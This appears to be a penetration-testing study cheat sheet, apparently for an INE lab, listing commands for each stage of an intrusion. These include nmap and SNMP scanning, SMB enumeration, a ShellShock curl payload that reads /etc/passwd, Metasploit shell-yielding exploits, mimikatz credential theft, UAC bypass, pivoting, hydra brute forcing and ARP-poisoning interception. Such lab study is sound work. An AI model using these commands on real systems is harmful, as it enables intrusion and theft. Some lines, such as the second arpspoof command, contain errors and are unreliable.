## CheatSheet 

### 1.Scanning

#### 1.1 Most used nmap command
    - scan -Pn -sn TARGET                 : Search all alive host with or without open ports 
    - scan -sV -n TARGET                  : Fingerprint all exposed services
    - scan -sV -n TARGET -p SEVICE_PORT   : Fingerprint a specific exposed service
    - scan -O -n TARGET                   : Find Operating System

#### 1.2 Metasploit
    - auxiliary/scanner/smb/smb_version 
    - auxiliary/scanner/portscan/tcp
    
### 3.DNS Misconfiguration

    - dig @authorative_dns_server -t axfr DOMAIN              :    Exploiting zone transfer to display all subdomains
    - dig @authorative_dns_server axfr -x subNet (192.168)    :    Reverse DNS

### 2.SMB Misconfiguration

nmap -p445 --script smb-protocols TARGET
nmap -p445 --script smb-security-mode TARGET
nmap -p445 --script smb-enum-users  TARGET

   #### 2.1 SMB Share
     Mount shared drive : 
       - Linux   : mount -t cifs -o user=USER,password=PWD,rw //IP/share
       - Windows : net use K: \\IPTarget\SharedDrive

   #### 2.2 Metasploit
    exploit/windows/smb/psexec
    exploit/windows/smb/smb_relay
    auxiliary/scanner/smb/smb_login
    auxiliary/scanner/smb/smb_enumshares

   #### 2.3 Check Null session (Anynomous Access)
    smbclient -L IPTarget


### 3.SNMP 
#### 3.1 Detection
    nmap -sU -p 161 Target

#### 3.2 Exploitation to guess community string and Collect Info
    nmap -sU -p 161 --script=snmp-brute Target
    snmpwalk -v 1 -c public Target
    nmap -sU -p 161 --script snmp-* Target > snmp_output

### 4.Exploitation

#### 4.1 Exploit ShellShock CVE-2014-6271 (suppose it is at /browser.cgi)
    nmap -sV -p80 --script http-shellshock --script-args uri=/browser.cgi,cmd='echo Content-Type: text/html; echo; /usr/bin/id' Target
    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://Target/browser.cgi

#### 4.2 Other common exploits 
    - exploit/unix/ftp/proftpd_133c_backdoor for ProFTPD ==> Result in a shell
    - exploit/multi/misc/java_rmi_server ==> Result in a shell
    - auxiliary/scanner/mysql/mysql_authbypass_hashdump ==> dump mysql password hashes
    - exploit/windows/http/badblue_passthru for badblue 2.7 ==> Result in a shell

### 3.Post Exploitation

#### 3.0 Infor Gathering
    run winenum
    run arp_scanner –r TargetNetworkSubnet
    run post/multi/gather/filezilla_client_cred

#### 3.1 Privilege Escalation

##### 3.1.1 All OS

    getsystem
    post/windows/gather/win_privs        : Check if UAC enabled
    exploit/windows/local/bypassuac      : Local exploit to bypass UAC
    
    - Method 1 : Search Local Exploit using MSF
    - Method 2 : Impersonate privileged users
    incognito
    mimikatz

##### 3.1.2 Via Windows Services 
    
    - Manually : 
        Search all services    
              ==> wmic service where 'NOT PathName like '%system32%' ' GET PathName, Name > list_srv.txt       
        For each service check if user can write in the service Path 
              ==> icacls “Path”
    
    - Using powerUp.ps1 script
        
##### 3.1.3 Specific Linux

#### 3.3 Pivoting
    From MSF Console : route add 192.168.4.0 (subnet) 255.255.255.0(mask) 6(session)
    From metrerpreter : run autoroute -s 192.168.4.0/24
    
    portfarwarding (meterpreter) ==>  portfwd add -l LocalPort -p ServicePort -r victimeIP (ex: portfwd add -l 1234 -p 80 -r 10.0.17.12)
    portfwd list    ==> This meterpreter command display current portforwarding

### 4.Bruteforcing

hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb


### 5.Sniffing

#### 5.1 MiTM between vtcim1 & victm2 using arp poisonning
    arpspoof -i tap0 -t vic1_IP -r vic2_IP
    arpspoof -i tap0 -t vic2_IP -r vic2_IP
